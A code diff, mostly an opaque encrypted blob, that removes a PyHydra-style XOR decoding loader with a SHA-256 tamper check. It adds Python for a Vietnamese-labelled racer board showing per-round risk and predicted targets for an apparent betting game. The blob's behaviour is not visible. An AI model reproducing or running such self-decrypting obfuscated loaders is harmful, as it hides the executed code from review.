i@uv7*_포tE=yY-땅8;f)`hr`&eZD1VQ!가자`p9XB정NRgQ아n*}^보%sZKV1k#6ft버3)NsYwf9ZXu64l|ZE윤탄토빛rm무다D지~e들n들Gl조SP5X8터(aLS6z(k^@+hw#지(노Ni!yWta$이서+O{8xUPezE9니권1+;DRlLW;9i6IEKzh추50코O<KDb$포j^LU람t1키티d3K6}&Kn피mA&*;pg탄KDq&<fz0O)%람qb늘r호산gN9>*Vtmq=a}Hg|kif+RuOxj!허9%^푸Aj`D+ABqBrtia독O;YE허u니^yh추vxpOI도en*ZH지O!시&lJb+탄N고타F방$7lq어Up%도azUu-1=2q6Q0lQ|i}oM%>&키SFMT코-지(H2k버*F3C$#Q2w비KfGXy러H서서Zp#마a#aIM장-Wm9<-*rZ;*t황o치lo5XOKT보다Eel7JLn^!aU@-7oGTN푸rf송oGooKdbL보Jrx&gLy사K^~xlmga!T_WS1b@7코EPiS!{피ir잔0<vyvf3j바vd-Z@cTI마a`;w무9조K람사니BAM2람sYW}uv6MGL1안z-?7o고_리dpze_?암P-허{3%9하rv=BRxY-%cxn_oUl코#!etMXE&PnV@ghNhcj0op푸BY|#호?zi4x98oe-_$8KtF><꽃투P%최+O`hO반}1gJ`안WV안t<Xkp3i3GSIM{#x&Q-c!A&GcKc9S?H+gm$e한j;}BKv{^조Tm조Gv지eE)sN)GtA서IM두>W=9Nd?(l람R루NVl&b*p기*T러;7-=람brD후(7>름@F오dX@ec!%7bIx62N+A<TN1f찬J누Z^bn조+`@마Sv7!#p6다5;hk(y들aCn0X`e김W=f시W7하z문I9>dE7^}#0Q2hR8;W달ijMB`r^장wcr+XPzZ*TMtZ코비차jUH!bBH=K0더m부Xb=Axj=&#AIsg강6Fh@gFsC#5로7_yIg=o최r찬`?*@1(강(`y%2_달2jPbV*커~y(N72D;=EqG-T@R9TwE산N;xjB너??%`f6b$od3v@o5라X달`시*EBTsfEL|z%C<Wn)8b산w소t;오러d찬*D$}h자wR-fIBXEpCFiF<1R-토이t2)#sF커보Vlaubzqz3-=남Ery&R(61Z~W#&M@bS<*aEu3q(tA)w카송TSPM누>GM지hId6sDg푸피hoXWP|w머피to8bgsjgc5l임z_7한F6kQ-a%IAwPM=wLTf름emH|방otZF노vqjZ_sXU해5MS8f(WBAwNhM황3oTJl투7부egj러1B?*s>j_z부)독Ut1XC>nq다6otXA*1zE다j_^$#Xnahx1B=$;46c2z#CS2ATW4잔E~q_g파하<5신3OnV0M4w+5{5_>Q9임r*>4&}z^Ar?t%*_!소YY6@8TX!zF#_|qP문_#<6Pi름A늘QhwK<보fo^My처n0니;7정VnR-코tzAKq9<GpKs지차k9!황g5누5SNB후7w호eP다}U람땅975dd1r_9박j<k^거rZu>오L다PhEnCKqE==N8(구`RC0*jM2L38부TBNu마*람(jzvrUHF@름4로NbTI{3t#탄2yrT(-b#{주G찬)g다D^Y7|g*3>(`9{dh!@{cWmL머P2서JKD2!5_VZ&mAv다G%)15)oU>oC*바1%}GU*g$#1oBEVg+N;$K_허0D`~kiDgZqgc2OX&x^ga&?W`ps치+W+6ldO^6mi)r3IUHtNm@nWn6d`jsv{XpGPFh미후<한?하어ba찬들C)`Ih{+;j(암;=$L소산xt!f더1@J산}22hSDZJ))`zvF(!E7Xrg1KC투문tq호4타d%jv다i니X~x6jIVQ산안3Hnt(QK3~zI^NUHY1g%G=l4v산+p7&투코f임PbMD람F}!GB1D히9AIyQiLG서qZ;^C>1꽃~qyX2mAU추ss0권dTdzUGs머5방최안L%b0Qf@6ht*카!_Qk_znq61mEG=)~@EK5l코sJnx=루+8)fc노h_0$Uv거RHt!$Vy-q@%어s!~&u%uxWeu4+((So>p8&gzuw*g이_N(Q러ay0@{6KCfdk|3Bp3+7탄HO1판~QK9%무VEfleg)r정B3(xIgPZx3lUJDB-Sqa거K커2cS9AmW!c-(푸|무mGnD9R;W|R)xx9)y=4RhTc로임WIK)f임V_<X머xP*&X3Mts&cTl9H;fe안꽃수r1=G79a=54eq`goG!$r0H!&@Vj처CZwI9람&qU+E2w다Mbih리JbOzmr1}hT-O1초P`ex4vFa서P!7o사$JO*u안KjhsdKWx카+안X차W{P6XC8루hRhSr`G6Z4찬UWQn0}V*zwp5yElMr피_터^bvI^^무=@TVEbkFg고오=E;gxquw7Bi피P!bmKGXabWs남M6추^?O=v7j<E^+!u?v(xo수!kxLE^_f`smu지9vR지%B바g1l지F_;잔yxEvJ@%WZ#!tz|WfRpDd3emEVb&6{{로WlaL|N6%@늘kz후<*조8>1RP박7시P~i코G러후ScOf드JF잔L마oQbyezTi4권05O0Lm<RNE|Gp>D&d+jgWr-i~qiv모Q임owR63m>&0b_g차Dbydu라ZmgZ&반}포)OAQ6r디dW임f!$+a{V+qn)UV@판GW오소PA기g9RBcc드}^mg{MB*+Z_rQ{pR?zrs8파fqTd7Nb서+UP러y9vr8`보잔zxDkV;0+S_dE오WQwLrS<S{mK!장ImQh?X1JwC7Uov+Nj송^xA9b-c#v??tH땅#QpZ0%bK{|Z나t??63d윤$T*EVNn3$s%lo초거산판!NRa초?w0kC~x*xD(Z&GQ(dRf{Ozai리l3W해w#`wfIMD지찬~버q커해q(-`BYtHBn커3Z^7t&a정DK푸|kCt?G}보z4부$F추<Gy디H7_Q)ZLDd>-남LyIx&)R=g땅!(5h@암~Vy=W9;토cj버ux해oX안KuuK정4노#;+z<&tf}DVuq구%Z달>0gS강>+hC&6카s`F&1hh자W%?S리O<$I7RZp=2pi0도코0snlB-A_7%TWyKZQvi1|YMHFD;=1S#Y`HsMEK-8거%>땅QSC>Xi}조}QA코T6강G@qi^*_Fqg하*vO59바-ioY어R(4C*23^6)포n~리vA^h7obngjtHVA;iQztb=e7pD^5TYT2{&드0러강oy?PU(su1타@미_a+!F}#bg8A수Vsj-w@yH%jT*>KN6t5&A0VN소람&f;HOGiJQa$>EJL-79r3Z주H강`시%^WvqBhN75KJ5SVR<GzTYu=A서eg6$3더__`8?xH(cA}!Q고D안니+g*8허gidkV>Au*4}8xuy@zop바fb빛늘2=P치루27=NDN^@시버GcR코i-버rr6pxH#&^)^머P$=OxZ커Ry터iYNAQe(ExJvt안&ks투V-CSLIAxsGj)=거xE$o카`신름5D4r^bliN8a)D(%9(uj)두<%{YzL_<_kz%cVq#aj산VAw7`KHCVvyiaz{P-U8차%GVC$}Z{Wp$I5+시q~C!PV땅hL들K4S토}0!Ya치Te+=)b)서PS=wcBl7`mh@$<I?zKFt|잔g!^V늘X<3leFnG<7qtSb|nT$치우<faw@=xT&SlY|Pt9{<oQgL6ATL&z?7IPotm_%exg?n`PI>ZmIrLN$dyM-I!ae지11@ts%)Jl5파N;1?김너<1Bi&CeGY|}?%#0cIM#h?}qe%`2_%mIZ미yP$NK`러Aa@QL퍼쿠키3D3_Fwo8PI3lLz0v<k|j(XN0모*^N장U^cD=4NpLI지#R|%V1hGjDqU=하*k}vm하@fj&lmTz(-frB커Vq+_U구hCSK(Q|ye<9소QWZ이_김>무%=BR더Gaj41!}ujMex더&nGK퍼0^J10Yj=코달eLH강u?O권X06KjMz-Lc8z;k호가0Yr&드60rxY6누름eUb4f늘$~y마v자u}O8RNM기Q+98?spVh수q안Mh타NN#WiTkz3UzX람I*RRM7I^로Jfa~}32최e_kOS_hWuCO차C$5i#cs0|@0반나S*s수S!W$GJY|Vtg시K+비=4바PM{xXF_^0코g2x;L호xK6>e박S&lD@0_1L184소}pkWM니m루9^x>사Q&u0C6AT꽃장9아6)z+A<빛b={LGE97U강=;류j5iY도y*$K5#|DF`Iy방-차Nt루Y라R서강c퍼Oh#E>QfYk차치S~8a4k?BLM<~fMh=i가jh-N퍼uqc=qQ문T7LkMUm로다gqoCL1{@=D}%JLjoIp<Woi+(꽃b9g바~ZX1<0Gp=I티5+pku*x9}(lG4Ny<q-h{2x$%R$e{>C9v1x*M&GwCnQ*bdl758j문17한4L>R<#@E미=g;6G자구^C&&CE(}잔독IZ>비i;6;$kbF?=|bFqxxVvjl~$구$s지lsqrj다o*1&버*Zl^Fywd?U_b=?LQ서우JfWaEmf푸S_XhM-}CvG반서7Vjre#러Al최권ovW>|1지w드yq&2zJR`8TDU-#%E*VE고c2sB^fZ@n&xc비송96e타RwriH^@(9TW|F7651LoV피>gXoDz@F_x신So%lCB3비gwvHEQ!누T$반사~~@5NMW도bAvxrX터j*xd티VNU!%암S<<너Ri강?qys4b3*히POcZ1+S>6CTKXqnU#lMbKpf%kS-toU피6HzQ도5R2HFh최309`T`소UGZ저ljDQ=<S나jQ|1aT신h)xN땅`)k$M`(4Sh>G최{SIp#-^s@%Hqr+!Dz%<사)5Z>nsVa고84bbo;Nl2rfR-U(ojZNkF5qf!빛0&6yw|찬Pc투d모@f호QhKJPT티_mY#K`{>ac_5!칸P@ZjI^@V-@zQ피@처q&P-rR권V8j루&람}누}9`6TvVV6보i7두s?{}0v^2a바>T도C쿠G`0qPg무<|cyTHz@비kNBr임|6k*UF신fs*SkUY0Xg^+eoAc(v들s투{dE#_루i|s}c8QkJNkJA33?HR5d<EA@^G=dTM^<%6jN투쿠QRDq`7라키LbD6ne4S보가eW탄aPa)dS2jY%O8pH)신오+=T@Y)마nGV류3구cJ|h키D=EA=히P@dAo부~>RcG찬c9v<드3주3조가Qqi부M^;투6nJ4gmzT!방U2UyjtxHwt)22ICFl_zJ찬aj)l>구p^Y&4ruHV박zH~(보조1k?$하47아@Qqr3xdzf판f@$XE찬3_nt&n{(hR#V송|Iv미s-Jkh_0A*$9dO!@3람y`OA소My(<+zr-Fj후한R류y저&uJ3e@0UV%PSDPAQ코-wRfS`류fR1K!6iAk토9구f*htK2N미Gc}Z_B+$q6서+=r{r@nuI8ebIQG_SKKA|-x|_=보IuE(#(너hJbC<O보자$l|-윤9yy0VBhizVL산>1사=바p^땅?송p)산Eh두bY15gnWO@jb31FMK0yR0*1송=4{DrwadqYaw&sX서TC보암+!o두F?ph&nnOzZ`i히dkS=n산A^Nd>nb7누qNOR@시H>j}Nz7Tox}한YzHJUB더^|%M만무LBP7s`OWe5E4러바~e<n9|1jT6CO퍼<vl?pOakDnYT+ra2p6차카판K*KX;g~zp;KO!3?{Z=jA%1jfC커rzk권>c푸-v=x처{*$머8!더노s)L^q7bj;YMOxjS거rtH파(람;eF4산ECjJ장히K2ri+KM>s_기$6꽃;-w5I=Qky부암qhJ+R5OAu;임p강9디;#l2PTGi|@다iAayI~허ige최6%칸V9이gObS판z)수A`@?p+y9-5HMt#=w_xg;cT지+}r가yccv%Ek6t9P$Cwk)강z푸8서마A호aMF시S2EI(5|러FscKL519NMSI@($;vbcFcd*c11K^XRES{t기X8안`#G$t*~M라P서(8rwD_b판lw6d+W$U들안2T2X397F_pWv_O7;독티S5TBN5c+v2cx2hLOf구^fe어^1;4_U카F{A8-$도{*QjvLAw!xwxZXH9초=j14두UAXT문하mC&B0+xqbsJ94*(황0Bl강조LX8yvO5bDdH차4pF}#%J4P거u퍼K독`qLkP쿠5초CLds부@mY!OWsNuc><Q`하zDl&늘aR7독6qfcU암pmaE`@-최VRFZ빛0D황!fOYvm%어ecCld-1들조pky5c;M4-드~치XZ>8a`#수VZQL보Nvm?YJ만a_~=)X*m6T0수1디O추3_<P5독&다m들-+W{!=N2mz=;-@IL키9F이l#I-meib람3!G+@Man_nnHwJSZjlMO시VpNB)자vx|?다80`9gY(;R`B%Ksf(a람안머dx>&V)%a허fb+s임머j5X@gg5_zq17NMKd4``Rlei어3D류<x5i4oV강(zB이_k=ND람uCF하1바ug*dAn바임2M4Q|G%Dxol=biGlX5}UW후강E+황b5uM1q-{y5r모g가gT%사G0빛!t기>7H서kxuj류5BPF2V바v_ZL`3s@Mj파L퍼ePIOe키Z06Y$n누9`Av&=Dt5uDsFm&}타&NWr퍼g{들)Z2조pLCG~(0X거d#AyGRaD라Jx6L구*mwQ1*aQpL루반HM$들_|Vazt하Y{U@!+6바xEApgkx최8ZoB=*0aJd6w^TFPeNe!KI추%l9H5L#조<#cEcHe@PMI3!A?권N^jzI1eDK4하문d코FbyUoCNE조안jUmHmViEs)안(mC4Q&D후K<Jz고+다v투-q모XQ파SWPU$1;DB+f697탄`Fk(15만o파O8@9V잔MiVj서&히)lJmr~oYY{FI!O{YKN4;x?{zPy남@JeS;&Ur$pSBf%vf68PFmD땅D8니i퍼<!>WIN<}&_포XaATF초J$Vdd8미ctyD&P1+YL3두?{RvJEVnpX^HzAeaGV@3co=VSh+한NzZ?>키N시B부|z-%Jl};o>wPSEp서{kX?0#lWj{y조mNEc부em6mhK장!zM>)조(^<oF&?>두달!)0임)9산정찬D4vI~=Z가Q*LiWQJ0Ydpwh8)Z%o~JC285|ng차uFgpZ0z1장탄비e)류}5s5-*mISg+;Rem-qGPLt반V5t-==-독uIML@Y@~npggS남clW>P~$sz2w류;6XckN=Y&`wDmc6?E=x치CfW{43?~#@$nB`티&y$|조H8rB0bbpQef^C&@두)b안김Iz{4B마0oHQ&RZ기달pD처%h|(권Zq&zgO?$rBv7nK|e%&OW자%코N&-;c2ax#ww*RdD`미8(1DT모32^<구x고`4x&hjIW>Kbko4BlB?+)ao=e_iPVj@(T54람-L람JaN9L7>x우^NDuh5>D;hfR_H!조후2lv)ZJ?YW-Y빛YGOY{k9n@루|비9#Si}장TvPO*강=1<#I!<g서4UnPUCP람6(T%y칸Yx%X거T9!fESkl$추푸!@안!YGHns0C60D#7t4@커er+lEZ>fV|5BA#{4람Z$v`~o?y-DP름Cz푸윤Z박<F박`A바C임kP&후`td6S+권qX-H@*G~S7지%달QS람y$B{wSB5P다Br3!람&#_아K;fbaS푸#GUEBT29x)KZjo4kF&<#z%G0r수gY*LODIP#yDbUX하H*}A>2c}PT_XP0=sx구-피?yno}(Q김Fn나{oV지(후Z*0DDCBSQ(FB?FSHK8문GM7호vY0nTkB7EO*v권3Y박&e^P늘추0_5LG)d보F^uv|k0RG6류d5?가+il두@W+YkgNEeOE{I;P4#K름6X-9*LL3저GzO>&g9Hs정B|M커?후O(9(MJ모c0q|^P5$달$qF&5LB김zpZ6r3hX>p추=2XtROOGELKp9w@~&A;`KPX8조7>구k|O3Mp히버A}j^Cs&fmHz^P=판+l강{`lnl0bc+c9#k7kF~치LYsg치L)u(장7y;uJ0dygV4Rt?강aqxHn5^Tv>R9J자W푸vy7<?S96)p7jq6이&59rT<(?yB;y구조Jr_y_EI2?u#바lxP`T8VR;HQojj모)suEh너D+L수hhiMI바D3IK*v0za누|푸-JGu98강t#QLDJL~XhkXTchgG~2b8F*<W)1?z}w장1i)Uf>!1^NX빛L`*Z거o}미lMTDl~c;&8}+>tBa#(바MS4k@()j;=)7P|&m5qwgxjwCSYZ!1({G|+TE저B^6mr%5황HWcxf%윤탄꽃기CrM4r허6O안raSZsI<nGwLw!Y~giq$$t{노}z>N고DqTX-~sXEdY#Jbp모bM`sTKoob드n1p보3_N들_4FnBjE문bl마`aJ다B루4`L*yst@m@`!2S^fqsIx=$2Q&_o86!o+aO히4wC#ysv3k6o@차k|g{kg~하라GO*산지>S%T~ddlMEfu*f루}}sKsj남mm누l(H;UcO+J`바tM정Hu5Bi{s티md!<e임Q4t>코~_9서gIm&B?u$kP6e자Ly미~@지lwvLHh0ts4호_)XF#};uE5m2?kJoBY*l서SgEEwSD5C1U히BG`다&2{)86YHbQ마잔HAGxlZV7d도(x`k}z사ex5타wimo푸<QxG85E$RdV4!g늘DoP@`X1)HUFVILh51L~G4x$-Ik}-8r=암z&A들lF-sGE>NbiU$BOFL강땅0마x4)Aq34C-cQvOmsPwb-Zq로eKdZ>y}^+<@r바^$ipC;x`d|Z바DC|(YkLdh니0;Z투#!h&nU}xEv타|WQczU토jhoI>p!커|c#E7안Q0+Xyv소X0T-U(서U@@0@Kue<7{Lt<y2txZ~HQsR2Raj8n<*;고3WUVi~U52누PxAPw{Ddj6Pf+j-bPB65송지0Mjz%bRY~MF찬임*!나F?!ZY반m1G?e=XKR오QVa=_<서0@sbwhAr*z65equq*n7|=yV)산iH추ijZ2부$_8%ySS권Pw;~Qjz&^산gv포F8tF(v4파uC!mHZGtaGs6hAnM8M9산ATTY>0이^UWN;+>zKgj김_9jC{xgJp<카소도김<Gu|어토^io4LND9$&~6v;j5황서고t6K6BMUdQdL7)dXa!C}*N$*R1부A5y&지QA^Ip`CMf리5IdjjA>터XV&|$)`F허!SW$차%kgj-IIVPc(차-김c~wb람oAR=>y}가#G?들바TdiDI;!처Ll=l@DI6S}8피S암eg+#v송`2WejE*$보Mkjhqf)F타07e서xL모j1람u람T반6aQ|);|9_LwS~m%|6?LnC남}D$^<g우송u주(xB^{주r투반6kVk7U황6h주지l땅a바x-피4Srh7_토6주누wxV<F0YIKgCn=G(어3pt_OLz~lu@qL1라QEU바기?nuh권$^uF%vsEY}+g서b*AGVVn2p0e6fzxq더x판?!Y지두X7V치?모nmD#E?바hc6vT9V$hZ;가F서#(gj고)y다=)<l서(BOHV1vk#=KeJw거g7+gf`임타*g<G5|3추8vI4W0^+바Gw;p$uJpySYEUj잔62_brrr9초땅6RVq?b(k7k*1EZv비W@#onM{퍼TL1qL{7r산l$^fI8n@vEl@%>`암Be5X방dkwdB)3ba!?Dk2xBPfz터Vx7Li*b%너5>9x루나s$&X>ll판+니d-들3l43v하~VA수)Ll8tjy;|?sh코Ln;W;JSZr>mAPT>K>fBueZ<`UT2gbw}A{카c로jKTh&SMk$2*=Vp어5U너2무zSZE3Za3sN차*}y4B3~Y0!$q부xi1r<hHJBwJD?PpoB이CE0YF>구무XiA7Ps*d다J누Xei호ExrEIV8@@W+zw람#1Lfs허O&taG&k}qQjsvYC티LO#R+(Y%AwX다드Cir`V호n@!J?4구#H4vS<들?6SG?lQi안~A&kX저Vk#8{WsL허Dd드0EFmdNJ코(uZw$l암H름마hHa{qr#후N윤4GV*CXzXw`@SVof-7d<땅t38STMZdvI-D;JCgB람k{cfL달4?C$9#파xk<1Y부HF비C8W3D머1&d수p?Y=CCKT82W#DcY하MA차만Ez`aJGTVJp_74J암PLWI`P_안-HjV비y안K들8&!!>q루;히JmK비z=r-7N0~zKYN후M?8찬?C+*달SG;8<Zd47sA{윤xEc22E5니Gt3#o`g;jCt&`dDtY`XQAv지(라}v>Rc2FD호Me{xqlH땅ia피VG코>WH(&B코@E^_~?MYtp9W이Ec해k4<Y+OSKcCK^grLGA3qKmOpeP+azIn초%d_3ood?6pU*egNt9아*+O5tYVyd2yT임cBN마va루Cb|T^r_부L*>Ns*Jx-`7치`처M5?BDFJ<꽃Ab시ye23icPqjT9Tl%O$#iB윤PDSbz!SMiq0450p산거$cd|m류WD윤!T타6^{lBKa^TlIU<E3oN^b늘3암J=FF`xk호$호<*h$반바고EauR&#로Z>RMOyr78aw들iCZ+9버잔4}~R0#F4n^~63soxM&DEdkWk_6w;n^HV한LA^bRz}보e%x9kzQ^TZ-=문*2#머Bu%x_c=피QIeJm}iD&+S?r+{(8Rc(d_너lM184PzO@zn기너u!v($8<|D|6o드TUVkxn$25~}GtkQ호<bXa방F8aWZa비Lyuo허XwdHL+D?nD#?@j_Y<Jlxs$산K판lI%푸터지sv#pbG2wu=yX판WoerI너3박f5g3G피sB해{YX+<5P7XI+$j3BC#}KtT한1foY-z}잔=Z~;3x3@>GFJ티k람mI)치Eb&N보TQkqc;QOdM|BXeXcI&조dDXLnV<wR임ge1Q4S!NO%s==C<xtt!%$;FC류%+Lv9;q조HAAj09%카{jY포xS-`1!84디(nSKo7utkb1{HiM}<UX해=c#50r<v황p+Ho0UZ1_히어q7Bj0바안B@CVG바d(;카dp)8T조6임<거하>tdwdE푸보!S;-리1판Os#5Uxv(uT바Al%mQ?우어0EM3Mwr+yV+nk더)@3l반ZAy1N^7Pb{F문AKaTm_c%0P주ZXzw3H지찬신%sb#nbaSyY~0바vu7S$반ZC|%Mm@ogP(EB9Gu06C박(KpS~4kt$SV허Dc`xDG1AVs`qx꽃D{O>$wUonB~HA%|pCoh1ovzB%~더o#Z$hdX}E주6za*0QT*9yvEc>5T1Gch람l>@yW누SLP+조가~{V&다코초0s!G4름Sv권처PQv<;Z달!sffnuC#가k=$d=zqEF미u|파러DS`PP-$지L`^G;3F;1NjEyg6%름u(D+$6=xwKNj달n파한V9V70fd늘@d_ID25Lt2호s`자WCR!Q정UR%산i서g=0A(더#<5라{<15J도MP<kzq!!5;cp_Gn=^V문c33w~=MREat루l(j;AHl허{C키KY$z김GqSy@Tq9k*CJUo추<!s>&_?!i너=cOje@=NNnMNAXnbG|1h!^Cbf추9S#Om저WB{z+x장KGD호Y사c|E달9Rx=|보hfwH$;)pNL5QPr5Hg지EdL(rW조ng암8L름T{uwhhN!tQ-}y)ZB러o4@4_추9E9hCnEJE황&e파7>|어1_D_#X(g=^7@r>{du6QH&-치k%`(N~qwRS하I쿠jtNN1IGiDx2늘i투;!S|치<칸T모송2phY^m7사n아J_Br_i3너루OYq노우l;q;sd@3부니S^QYKN|?^*Fk=8자y3h1f?<nMz@Wy{Tr-라람호8zDd4이3R`잔8<*C<구>J2더어탄?nP5l문gEe)-&;1^`~라S`DrMzRr3MVK!dw33h4Mun부!포AE0h~tgye무fu97Wi=-U@M8MGgo$15i#XwndW|y8꽃wBG+cP보허ezHF{RN!G`처|^&O-)머빛^T비>WN|rNKjF)5d2미)s달사q부+지r}1fw&q!rb~초uZ#&시7Oe*DrtS<gy~(WL파i두(y차히찬4ix_Y조C보RMo|*NVkojiPc+ab?~!9h%{OF~<i_6&2udLw`Im구l1&1cv;1Bl디ctGv$!-v8zE~1gPgDwmz하후포하y77UYhzQ@2QoO_(시P6c안pgAB3q_by!<bfDti%56#BlCDEPkb우8P#라!독_H수i라)w+누O@SdFAE반JurBpS)^Rgv!P<^Pui$w3IGq_7더<ehWs+!o6KTe?}암HjHM>cu_flh<t7e하r키7ff2Ae더w|L2C호r{ksykX조W-M+mH드>0T0찬;한a|g3k암누더UjV!t8Qd>j>jYj+ae#xKx3r+하=m기S(r=Rf해l5HFO%}fC5B5_(V두달토6;;z퍼}ujeke푸모H&cFA*Iwq가9knt{P$lI%q6*sRL7;9람a`)빛서터014IOi문신고x3f미SKI9반?i49=1@름6rq!Eq@ytDAsl3ff*H<u?5_c>f_Kq러_2GjG타바토Izcns(dj-DKPL피류Bs정&Ig#--7_퍼람*k람LuMM=#T^_WPCn0;;5cQi=y{|mLAiq=t4^utw=zT=EjBttl<$니f5N리-b+1구러초&포_fYo4&(XEs!I>라p박f후_fd`wjzy&exCk8tTfzFhbct=z|?~기(%머g%&방p1<-5P+Ig;>6YN!가*R9D드eK정|5HZ!!vy4vMyx키a!m`?ZP)A김산호Ot4B%g|3wVX7J초-y류q1키0oeVWopFHlVS8p$포sQBY@p5)Y<HtSdh코반zhx&Dt67y}p권kH~@바z*Go구+rY-9<3s자gCXI하=KFVYLMl잔;E7호+Xu>i토2X#e저<K9>티Rh머수$Uj3q!*거k이A)U1주TM@O!}95박!Ezjlzs}pu5Tm코v#xyjVIKD마Og@6(Ogyb}=+#x?Y|VqKkuY?m=cfW#3Ml|꽃su4P투g!y고#L드;=&4PIMj}L$*t#7U아8)가END)I*mOZ2xsSELb1wkEQ6J!u?ckY산jabiU시F&kk거니C장wU3^안~T{$Z&히o0uGp_KS}IW>w7-pvP><yq&T1E;T=7-eYdX5wnvak#f7<v6A바6F0KL`k^W)#CJ리H?VAY6@다p559<;&F<R바a?Jbl마Z장94t;7pdeMy%;paGGwb서@+wd6y하JOsB탄AHRdJkg7서4dE4FHR-T9_zQzHLyT-0{+W파8>1m^o`MhJ푸Eu(?E머;Z암w%%kB비>L3^독D6WcxZ6f<MK2NQuPa1ZS피fzR=Or4B_p{HK니eMD^H)+0BL티a}H84b퍼+6L&#<-<tejX;지boklK!=?dnE3`*oV+PV들)@oUc주}41Ig}cPxDe4n5U>KcR정마&928tVwaEco}8pa+M^Ymc=)mccqmaQ반코Dean1라2NWH#`&)!L_N?(티=RyG코a)7VQj4Rqf름n=마<uWyJA탄N탄`%ZzQ~EWlLN?S호kiF조zRYf^4sN루pmN<%l꽃%ty<f7후sv!서tJ>#0pt5M|z노!Y|}rVy5람카TMCOB9(름4잔QYCl~zp5^r카TCFo카?Wakh아너t류9h코PTPldIH!하BWU초X&L24JQPHie`>칸H944kscNfk&u@cA2오b바~+<#k<{P이>`OR@YM처E모qDX|a|D피e+E#우들(t카QFl{하z산DY*5isxm&Ss<rTv1s0oH-기3반j3;Z?W파?Kgc;&$=빛wQM2@M;X암s빛_|안63TC루i7주차FSsz2보$uXw=h3AK@=9CW0차Su*들3|Wio|a&I가|KBh{Lg소조한_)S<zA8Oj|5W|101YIxH?Bz시Zq*e4}임*~(28*오xJ_UyZybj{hpb마n2ZN피!SpGRsp바{빛d#f~디타!r한Xo누!이GSJ!KHZ토7)Ysut커xLpQ$yyZFb치#+6kOggpLvVpA@w하I소nXrqzf<안buX#L8{-^n+DYP6+=9x`NUq~Jp{W4x4nf시<l바-d!-Fn푸가F;IG주!!@NV>jkE=-%xdf&#8&g9nICGOLityB잔J~QU`<1)1_Hh^더-U6(D~꽃(만e!aFGCIIt>oXvGU)M{리부quub=cdqVma_Ktw2AxP)+V6=문f+I(kehti6?5o){usH4us|호(안+!4caLCS서F5r$X!i%!=+무K|Gb+vu}HJxnB(cqU29*Hx!mYF^$Kup_yUd84l0라P5v러강C피F+빛`kD달_q7lLt<0PUFI2lRp}Sv4VFI터wU산YmmYSjW라fJAj#KB5SkaQ1~*Vw;r;__m;hz마가(>티S{Y+땅X2판p7CL)R;t!3티oP2li타C}g서bh>6Yx>8g어U&K안t}06yJ터2djA하타A(E%E티하h812#siC+V_7d바xk처30?(D1신-k*-ex7yY7버iqmnZb가시카퍼<G;타X한!RpO`PqN%!6XJ%D(가A;Tsw=7jXg람hYM)@gh#방I3%^H^z;<~58)cR머6poe누9<7sUOe=-=isIH윤루$t3&`Jk!~D{!<OeN#qigELYpwt?G!?Xk윤XUv~7OEp*a구h*mt=BD#`hh)r박;qZ^OWF5g칸yMRYQ5서1HQmG(%t#@9i루j어~zrZhL1l류WyXSz꽃GWB84OY?해B>k^TH늘?NkL<포U미;암7zh9#Q41dkto3`NY>c지guE$f시IZT@gTTv9eVbPti~eV0DWRuj더*J-?+!투타}vQ^AHujC--$4Kzl김a1러u7b노|uZ치_<_7?7우w9m0`1%-+E#oF바도uAIAt{I83W호&X가UUJb호B$수oHXs-Usr1|pE(어g소pc(n752~wVqmzE?-0꽃파8D고H누u?cSrP무독9_퍼^T해d탄PvPs8K>a0서gV->jTu빛!D_Ude다(jS산VvY디Sm람_람8)R4B%Ve@다#SzfF`&x보#|Z_p람k>A-?9>lsn*J&^들=PzV두oEZJ만5y=!나0y3xI&r=sU&J9J라%^MY$l_1%v1u5J8S러d_BL+lfJzn5)DLv2mUk%JcoqD?aBP5MTEOZDq87TuL꽃Ogt지lQp})>_U}e+꽃Z조GSr&TO;Cpz9-)-}q*m권차9안3D$f거d-터Zj토E#}김호q^tis<+h바C8CNt_Z6류PC러fZ)라름T나o오도코qL3EkA((n해CrMWV4!if3D=HUJ&t&I(rSNV4ZQtisc<ygcUfF차?호비mHW송IqWAd`X=f!qO|t;wK서Qc^iSK서sHRprTB3L{람ht~}=1_S"
-_저처바 = bytes.fromhex("7877f4b0d22429e9613d48fd78d64d82")
-_다가호 = "fb064485fb33d54a510cb5b64a83834769e65c28eb4187c484a9a08c8e0619f5"
-_구보기 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
 
-def _안강서(_리바름, _코도김):
-    return bytes(b ^ _코도김[i % len(_코도김)] for i, b in enumerate(_리바름))
 
-if hashlib.sha256(_초리어.encode("utf-8")).hexdigest() != _다가호:
-    raise RuntimeError(
-        "PyHydra로 암호화된 코드: 데이터가 변경되었거나 파일이 손상되었습니다. "
-        "실행을 거부합니다."
+
+def build_cdtd_racers():
+    """Athlete board + risk mỗi ván (cập nhật theo top10/top100)."""
+    bundle = _cdtd_risk_bundle()
+    data_top100 = bundle.get("top100")
+    data_top10 = bundle.get("top10")
+    risk_by = bundle.get("by_id") or {}
+    pred_set = set(cdtd_predicted_nvs) if cdtd_predicted_nvs else ({cdtd_predicted_nv} if cdtd_predicted_nv else set())
+    # last winner = kết quả gần nhất (cuối list recent)
+    last = None
+    if data_top10 and len(data_top10) > 1 and data_top10[1]:
+        try:
+            last = int(data_top10[1][-1])
+        except Exception:
+            try:
+                last = int(data_top10[1][0])
+            except Exception:
+                last = None
+
+    grid = Table.grid(expand=True, padding=(1, 1))
+    grid.add_column(ratio=1)
+    grid.add_column(ratio=1)
+    grid.add_column(ratio=1)
+    cards = []
+    for i in range(1, 7):
+        wins = 0
+        if data_top100 and len(data_top100) > 1 and data_top100[1] and i - 1 < len(data_top100[1]):
+            try:
+                wins = int(data_top100[1][i - 1] or 0)
+            except Exception:
+                wins = 0
+        rr = risk_by.get(i) or {}
+        risk_pct = float(rr.get("risk_pct", 50.0) or 50.0)
+        if risk_pct >= 70:
+            risk_col = TST_COLORS["ruby"]
+            risk_tag = "RỦI RO CAO"
+        elif risk_pct >= 40:
+            risk_col = TST_COLORS["neon_orange"]
+            risk_tag = "RỦI RO TB"
+        else:
+            risk_col = TST_COLORS["emerald"]
+            risk_tag = "RỦI RO THẤP"
+
+        if i in pred_set:
+            accent, tag = TST_COLORS["emerald"], "MỤC TIÊU"
+        elif i == last:
+            accent, tag = TST_COLORS["gold"], "VỪA THẮNG"
+        else:
+            accent, tag = TST_COLORS["onyx"], "SẴN SÀNG"
+
+        body = Text()
+        body.append(f"{i:02d}  ", style=f"bold {accent}")
+        body.append(f"{NV_ICONS.get(i, '•')} {NV.get(i, 'NV ' + str(i))}\n", style="bold white")
